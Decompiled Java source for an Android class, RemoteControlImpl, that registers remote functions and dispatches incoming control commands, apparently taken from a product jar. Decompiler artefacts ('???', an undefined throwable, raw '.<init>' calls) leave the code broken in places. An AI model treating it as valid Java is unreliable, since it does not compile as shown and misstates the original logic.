package com.vvt.remotecontrol;

import java.io.Serializable;
import java.util.HashSet;

public class RemoteControlImpl
  implements a, Serializable
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final long serialVersionUID = -7806698598861502337L;
  private HashSet mRegisteredFunctions;
  
  public RemoteControlImpl()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.mRegisteredFunctions = localHashSet;
  }
  
  public void clearRegisteredFunctions()
  {
    synchronized (this.mRegisteredFunctions)
    {
      HashSet localHashSet2 = this.mRegisteredFunctions;
      localHashSet2.clear();
      return;
    }
  }
  
  public Object execute(ControlCommand paramControlCommand)
  {
    Object localObject1 = paramControlCommand.getFunction();
    if (localObject1 == null)
    {
      localObject1 = new com/vvt/remotecontrol/RemoteControlException;
      ((RemoteControlException)localObject1).<init>("Function not specified.");
      throw ((Throwable)localObject1);
    }
    synchronized (this.mRegisteredFunctions)
    {
      HashSet localHashSet = this.mRegisteredFunctions;
      boolean bool1 = localHashSet.contains(localObject1);
      if (!bool1)
      {
        localObject1 = new com/vvt/remotecontrol/RemoteControlException;
        ((RemoteControlException)localObject1).<init>("Function not registered.");
        throw ((Throwable)localObject1);
      }
    }
    try
    {
      RemoteOnCommandReceive localRemoteOnCommandReceive = new com/vvt/remotecontrol/RemoteOnCommandReceive;
      localRemoteOnCommandReceive.<init>(paramControlCommand);
      return localRemoteOnCommandReceive.execute();
    }
    finally
    {
      boolean bool2 = a;
      if (bool2) {}
      ??? = new com/vvt/remotecontrol/RemoteControlException;
      ((RemoteControlException)???).<init>(localThrowable);
    }
  }
  
  public HashSet getRegisteredFunctions()
  {
    return this.mRegisteredFunctions;
  }
  
  public void registerFunction(RemoteFunction paramRemoteFunction)
  {
    synchronized (this.mRegisteredFunctions)
    {
      HashSet localHashSet2 = this.mRegisteredFunctions;
      localHashSet2.add(paramRemoteFunction);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/RemoteControlImpl.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */